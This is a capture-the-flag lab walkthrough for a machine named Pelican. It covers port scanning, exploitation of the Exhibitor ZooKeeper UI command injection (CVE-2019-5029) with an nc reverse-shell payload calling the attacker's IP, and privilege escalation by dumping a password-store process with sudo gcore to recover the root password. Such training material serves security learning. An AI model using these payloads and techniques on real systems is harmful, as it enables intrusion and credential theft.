---
description: 11/28/2022
---

# Pelican (Intermediate)

## Information Gathering

Scanned all TCP ports:

```
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8e16068bef58e707054b427ee9a7e7f (RSA)
|   256 bb999a453f350bb349e6cf1149878d94 (ECDSA)
|_  256 f2ebfc45d7e9807766a39353de00579c (ED25519)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
|_http-title: Forbidden - CUPS v2.2.10
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/2.2 IPP/2.1
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8e16068bef58e707054b427ee9a7e7f (RSA)
|   256 bb999a453f350bb349e6cf1149878d94 (ECDSA)
|_  256 f2ebfc45d7e9807766a39353de00579c (ED25519)
8080/tcp  open  http        Jetty 1.0
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(1.0)
8081/tcp  open  http        nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://192.168.211.98:8080/exhibitor/v1/ui/index.html
|_http-server-header: nginx/1.14.2
44091/tcp open  java-rmi    Java RMI
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-11-28T23:54:26
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2022-11-28T18:54:26-05:00
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
```

Enumerated UDP ports:

```
5353/udp  open          mdns            DNS-based service discovery
| dns-service-discovery: 
|   445/tcp smb
|     Address=192.168.211.98
|   Device Information
|_    Address=192.168.211.98
```

Notes:

* 445/Samba -- Anonymous login no access
* 631/CUPS 2.2
* 2181/zookeeper HTTP
* 8080/HTTP Server -- <mark style="color:yellow;">"Exhibitor" for ZooKeeper - v1.0</mark>
  * <mark style="color:yellow;">This seems very unique let's searchsploit it</mark>
  * <mark style="color:red;">Exhibitor Web UI 1.7.1 - Remote Code Execution -- 48654.txt</mark>

## Enumeration

### Port 8080 - HTTP (Jetty 1.0)

<mark style="color:yellow;">Searchsploit</mark>:&#x20;

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

* <mark style="color:yellow;">CVE-2019-5029</mark>

Version Enumeration:&#x20;

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption><p>v1.0 -- Confirming vulnerability to CVE-2019-5029</p></figcaption></figure>

## Exploitation

### <mark style="color:yellow;">Command Injection - CVE-2019-5029</mark>

48654.txt:

```
The steps to exploit it from a web browser:

    Open the Exhibitor Web UI and click on the Config tab, then flip the Editing switch to ON

    In the “java.env script” field, enter any command surrounded by $() or ``, for example, for a simple reverse shell:

    $(/bin/nc -e /bin/sh 10.0.0.64 4444 &)
    Click Commit > All At Once > OK
    The command may take up to a minute to execute.
```

Exploitation/Obtaining Foothold

1. Navigate to Config
2. Select on next to Editing
3. Next to java.env script, add the following <mark style="color:yellow;">`$(/bin/nc -e /bin/sh 192.168.49.211 1337 &)`</mark>
4. Start nc listener on 1337
5. Select commit > all at once > ok
6. Wait a few seconds for the command to execute and you will get your shell!

<figure><img src="../../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Fix shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Privilege Escalation

Attempted to exploit Polkit but it did not work for some reason because SSH kept asking for a password even when I would generate SSH keys on the target and transfer it to Kali -- Moving on.

* Uploaded linpeas and found a few interesting things

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption><p>password-store looks interesting</p></figcaption></figure>

sudo -l command output:

<figure><img src="../../../.gitbook/assets/image (2) (3).png" alt=""><figcaption></figcaption></figure>

GTFOBins:

<figure><img src="../../../.gitbook/assets/image (5) (4).png" alt=""><figcaption></figcaption></figure>

* We see that gcore can be used to generate core dumps of running processes
* Files often containing sensitive information can be targetted this way
* Since we can leverage our permissions with <mark style="color:yellow;">sudo + gcore, can we dump password-store</mark>?

<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption><p>using ps command to find pid of password-store to use with gcore</p></figcaption></figure>

* We see that <mark style="color:yellow;">password-store has a PID of 493</mark>
* Time to run <mark style="color:yellow;">gcore</mark> on it

gcore (create dump of PID 493):

```
sudo gcore 493
(...)

Saved corefile core.493
```

* Dump was saved as core.493

Reading contents of dump with strings:

```
strings core.493

(...)
Password: root:
ClogKingpinInning731
(...)
```

* We seemingly obtain the root password

```
su
Password: ClogKingpinInning731
```

<figure><img src="../../../.gitbook/assets/image (1) (10).png" alt=""><figcaption><p>We are root!</p></figcaption></figure>
